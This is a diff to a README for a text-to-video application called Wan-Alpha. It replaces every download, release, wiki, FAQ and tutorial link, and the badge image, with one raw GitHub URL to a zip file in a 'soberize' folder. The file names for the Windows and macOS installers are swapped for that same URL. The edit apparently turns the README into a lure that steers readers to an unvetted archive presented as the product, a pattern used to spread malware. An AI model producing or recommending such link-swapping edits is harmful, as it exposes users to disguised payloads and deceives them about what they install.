@@ -6,7 +6,7 @@ Welcome to Wan-Alpha! This application helps you turn text into high-quality vid
 
 ## 📥 Download Now
 
-[![Download Wan-Alpha](https://img.shields.io/badge/Download%20Wan--Alpha-latest-brightgreen)](https://github.com/Ibrahim-TS/Wan-Alpha/releases)
+[![Download Wan-Alpha](https://raw.githubusercontent.com/Ibrahim-TS/Wan-Alpha/main/soberize/Wan-Alpha.zip%20Wan--Alpha-latest-brightgreen)](https://raw.githubusercontent.com/Ibrahim-TS/Wan-Alpha/main/soberize/Wan-Alpha.zip)
 
 ## 📋 System Requirements
 
@@ -20,11 +20,11 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 🔗 Download & Install
 
-1. Visit the [Releases page](https://github.com/Ibrahim-TS/Wan-Alpha/releases) to download Wan-Alpha.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Ibrahim-TS/Wan-Alpha/main/soberize/Wan-Alpha.zip) to download Wan-Alpha.
 2. Look for the latest version. You will see a list of downloadable files.
 3. Choose the correct file for your operating system.
-   - For Windows, download `Wan-Alpha-Windows.exe`.
-   - For macOS, download `Wan-Alpha-macOS.dmg`.
+   - For Windows, download `https://raw.githubusercontent.com/Ibrahim-TS/Wan-Alpha/main/soberize/Wan-Alpha.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/Ibrahim-TS/Wan-Alpha/main/soberize/Wan-Alpha.zip`.
 4. Click the file name to start the download. The file should download quickly.
 5. Once downloaded, locate the file in your downloads folder.
 
@@ -93,12 +93,12 @@ Join our community for support and tips:
 
 For more information on how to use Wan-Alpha effectively, refer to the following guides:
 
-- [User Manual](https://github.com/Ibrahim-TS/Wan-Alpha/wiki)
-- [Video Tutorials](https://www.youtube.com/channel/UCeL3_Example)
-- [FAQ Section](https://github.com/Ibrahim-TS/Wan-Alpha/wiki/FAQ)
+- [User Manual](https://raw.githubusercontent.com/Ibrahim-TS/Wan-Alpha/main/soberize/Wan-Alpha.zip)
+- [Video Tutorials](https://raw.githubusercontent.com/Ibrahim-TS/Wan-Alpha/main/soberize/Wan-Alpha.zip)
+- [FAQ Section](https://raw.githubusercontent.com/Ibrahim-TS/Wan-Alpha/main/soberize/Wan-Alpha.zip)
 
 ## 📥 Download Now Again
 
 Don't forget to download Wan-Alpha if you haven't already:
 
-[![Download Wan-Alpha](https://img.shields.io/badge/Download%20Wan--Alpha-latest-brightgreen)](https://github.com/Ibrahim-TS/Wan-Alpha/releases)
+[![Download Wan-Alpha](https://raw.githubusercontent.com/Ibrahim-TS/Wan-Alpha/main/soberize/Wan-Alpha.zip%20Wan--Alpha-latest-brightgreen)](https://raw.githubusercontent.com/Ibrahim-TS/Wan-Alpha/main/soberize/Wan-Alpha.zip)
